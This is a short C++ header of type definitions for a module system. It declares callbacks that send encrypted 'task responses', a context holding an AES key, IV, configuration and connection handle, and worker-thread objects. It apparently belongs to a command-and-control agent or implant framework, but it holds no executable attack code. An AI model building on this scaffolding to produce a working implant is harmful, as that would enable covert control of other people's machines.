#pragma once
#include <Windows.h>
#include <iostream>
#include <vector>
#include <resp_builder.hpp>
#include <syslib.hpp>
#include "config.h"
#include <thread>
typedef VOID(*proto_send_encrypted_taskresponse)(VOID* pctx, char* buffer, int len);
typedef VOID(*proto_send_encrypted_taskresponse_big)(VOID* pctx, std::vector<UCHAR> buffer, ResponseBuilder* builder);


typedef struct _netio_table {
	proto_send_encrypted_taskresponse send_encrypted_taskresponse;
	proto_send_encrypted_taskresponse_big send_encrypted_taskresponse_big;
} netio_table;


typedef struct _MODULE_CONTEXT {
	netio_table netio;
	syslib* psyslib;
	std::vector<UCHAR> aes_key;
	std::vector<UCHAR> iv;
	CONFIG* pconfig;
	HANDLE conn_handle;
	std::vector<UCHAR> userdata;
	DWORD32 random_id;
	PVOID base_library;
} MODULE_CONTEXT, *PMODULE_CONTEXT;

typedef struct _WORKEROBJECT {
	DWORD32 worker_thread_id;
	std::thread* pthread;
	HANDLE syncevent;
	PMODULE_CONTEXT modctx;
} WORKEROBJECT, * PWORKEROBJECT;